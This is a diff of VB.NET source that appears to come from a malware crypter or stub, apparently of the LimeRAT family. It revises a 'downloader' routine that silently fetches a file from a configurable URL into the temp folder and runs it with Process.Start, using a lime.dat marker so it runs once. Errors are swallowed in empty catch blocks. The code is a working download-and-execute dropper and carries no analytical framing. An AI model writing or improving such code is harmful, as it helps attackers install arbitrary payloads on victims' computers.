@@ -62,7 +62,7 @@ Public Module Core
             If Xsec = "0" Then
                 Threading.Thread.Sleep(2000)
             Else
-                Threading.Thread.Sleep(Math.Round(Math.Round(CompilerServices.Conversions.ToDouble(Xsec) * 1000.0)))
+                Threading.Thread.Sleep(Xsec * 1000)
             End If
         Catch ex As Exception
         End Try
@@ -117,23 +117,31 @@ Public Module Core
 
         'final step, downloader | not EntryPoint.Invoke
         Try
-            If DWCHK = True Then
-                If IO.File.Exists(IO.Path.GetTempPath + "\lime.dat") Then
-                    'already ran once
+            If DWURL <> "" Then
+                If DWCHK = True Then
+                    If IO.File.Exists(IO.Path.GetTempPath + "\lime.dat") Then
+                        'already ran once
+                    Else
+                        'didn't run at all
+                        Dim DW As New Net.WebClient
+                        Dim DWMNAME = IO.Path.GetTempFileName + IO.Path.GetExtension(DWURL)
+                        DW.DownloadFile(DWURL, DWMNAME)
+                        Process.Start(DWMNAME)
+                        'Got idea to create data file to store info
+                        'reading data then apply it to current settings without updating client.exe
+                        'ex. change host/port without updating the client
+                        Using sw As IO.StreamWriter = IO.File.CreateText(IO.Path.GetTempPath + "\lime.dat")
+                            sw.Flush()
+                            sw.Close()
+                        End Using
+                    End If
                 Else
-                    'didn't run at all
+                    'dwchk = false
                     Dim DW As New Net.WebClient
                     Dim DWMNAME = IO.Path.GetTempFileName + IO.Path.GetExtension(DWURL)
                     DW.DownloadFile(DWURL, DWMNAME)
                     Process.Start(DWMNAME)
-                    IO.File.Create(IO.Path.GetTempPath + "\lime.dat")
                 End If
-            Else
-            'dwchk is false
-                Dim DW As New Net.WebClient
-                Dim DWMNAME = IO.Path.GetTempFileName + IO.Path.GetExtension(DWURL)
-                DW.DownloadFile(DWURL, DWMNAME)
-                Process.Start(DWMNAME)
             End If
         Catch ex As Exception
         End Try
